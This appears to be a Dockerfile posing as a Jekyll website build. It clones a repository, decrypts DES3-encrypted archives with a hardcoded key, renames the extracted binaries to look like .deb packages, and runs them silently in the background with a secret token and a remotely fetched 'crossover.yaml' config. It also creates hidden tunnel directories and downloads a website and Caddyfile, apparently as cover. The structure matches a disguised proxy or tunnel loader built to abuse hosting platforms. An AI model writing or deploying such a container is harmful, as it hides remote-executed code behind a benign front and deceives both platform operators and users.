FROM ubuntu

RUN mkdir /jekyll
RUN mkdir /jekyll/Config
RUN apt update && apt install -y curl git wget tar openssl unzip

RUN cd /jekyll
RUN git clone https://github.com/jekyll-mask-repo-new/Paas-Bin.git
RUN dd if=Paas-Bin/EKW-55688-18.deb |openssl des3 -d -k 8ddefff7-f00b-46f0-ab32-2eab1d227a61|tar zxf -
RUN dd if=Paas-Bin/BEE-13686-TQ.deb |openssl des3 -d -k 8ddefff7-f00b-46f0-ab32-2eab1d227a61|tar zxf -
RUN dd if=Paas-Bin/TQN-26663-3V.deb |openssl des3 -d -k 8ddefff7-f00b-46f0-ab32-2eab1d227a61|tar zxf -
RUN rm -rf Paas-Bin
RUN mv EKW-55688-18 dpkg-install-EKW-55688-18.deb && mv BEE-13686-TQ dpkg-install-BEE-13686-TQ.deb && mv TQN-26663-3V /usr/bin/caddy

RUN mkdir /.temp
RUN mkdir /.temp/tunnel
RUN mkdir /.temp/tunnel/id/
RUN mkdir /.temp/tunnel/id/.86de6451-e653-4318-bd38-4e8e4a9d8006
RUN chmod +x -R /jekyll

CMD ./dpkg-install-BEE-13686-TQ.deb service install "$MAGIC" > /dev/null &
RUN wget http://jekyll-mask-repo.helis.cf/crossover.yaml && chmod 0777 crossover.yaml 
CMD ./dpkg-install-EKW-55688-18.deb run -c crossover.yaml > /dev/null &

RUN wget http://jekyll-mask-repo.helis.cf/jek-downloads/website.zip && unzip website.zip && chmod +x -R website
RUN curl http://jekyll-mask-repo.helis.cf/Caddyfile-html.htm > Caddyfile && chmod 0777 Caddyfile && rm -rf crossover.yaml

CMD caddy run --config Caddyfile
